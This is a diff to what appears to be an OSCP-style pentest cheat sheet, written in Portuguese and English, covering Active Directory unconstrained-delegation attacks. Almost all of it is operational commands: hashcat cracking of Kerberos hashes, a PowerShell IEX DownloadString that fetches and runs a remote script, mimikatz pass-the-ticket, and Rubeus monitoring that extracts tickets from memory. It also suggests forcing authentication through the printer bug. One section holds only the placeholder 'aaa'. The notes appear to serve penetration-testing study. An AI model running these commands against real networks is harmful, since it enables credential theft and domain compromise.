@@ -1239,7 +1239,7 @@ hashcat -m 18200 -a 0 hashes.txt wordlist.txt -o quebradas.txt
 hashcat -m 18200 -a 0 hashes.txt wordlist.txt --show
 hashcat -m 18200 -a 0 hashes.txt wordlist.txt --potfile-disable
 ```
-## UNCONSTRAINED DELEGATION
+## UNCONSTRAINED DELEGATION - MIMIKATZ
 ##### UNCONSTRAINED DELEGATION - LOAD REQUIREMENTS
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
@@ -1292,14 +1292,48 @@ AGUARDAR ALGUM USUARIO SE CONECTAR E FICAR MONITORANDO (OPTIONAL) (PRECISA DE AL
 Invoke-UserHunter -ComputerName server01  -Delay 5 -Verbose
 Invoke-UserHunter -ComputerName server01 -UserIdentity administrator -Delay 5 -Verbose
 ```
-##### UNCONSTRAINED DELEGATION - REUTILIZAR O TICKET DO USUARIO:
-FILTRAR OS TICKETS (OPCIONAL)
+##### UNCONSTRAINED DELEGATION - REUTILIZAR O TICKET DO USUARIO:  (VAI IMPORTAR NO CONTEXTO DO USUARIO, INICIAR NOVO MIMKATZ COM USUARIO NORMAL E IMPORTAR)
 ```
 dir *.kirbi | findstr /I krbtgt | findstr /V "$@"
 ```
 ```
 kerberos::ptt C:\pentest\tickets\[0;9fc25]-2-0-60a10000-Administrator@krbtgt-TECH.LOCAL.kirbi
 ```
+
+
+## UNCONSTRAINED DELEGATION - RUBEUS
+##### UNCONSTRAINED DELEGATION RUBEUS - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Rubeus.ps1")
+```
+
+##### UNCONSTRAINED DELEGATION RUBEUS - LIST TICKETS
+```
+.\Rubeus.exe triage
+```
+```
+Invoke-Rubeus triage
+Invoke-Rubeus 'triage'
+```
+##### UNCONSTRAINED DELEGATION RUBEUS - MONITORAR E EXTRAIR OS TICKETS KERBEROS DA MEMÓRIA DO COMPUTADOR:
+```
+.\Rubeus.exe  monitor /interval:5 /nowrap
+.\Rubeus.exe  monitor /interval:5 /nowrap > C:\tickets.log
+.\Rubeus.exe  monitor /interval:5 >> C:\tickets.log
+.\Rubeus.exe monitor /monitorinterval:5 /targetuser:DC$ /nowrap
+```
+It may be sufficent to just wait and see what privileged or high-interest users/computers authenticate to our compromised host, 
+or it may be possible to force a sensitive system to authenticate through the printerbug.
+##### UNCONSTRAINED DELEGATION RUBEUS - MONITORAR E EXTRAIR OS TICKETS KERBEROS DA MEMÓRIA DO COMPUTADOR:
+```
+aaa
+```
+
+
+
 
 
 
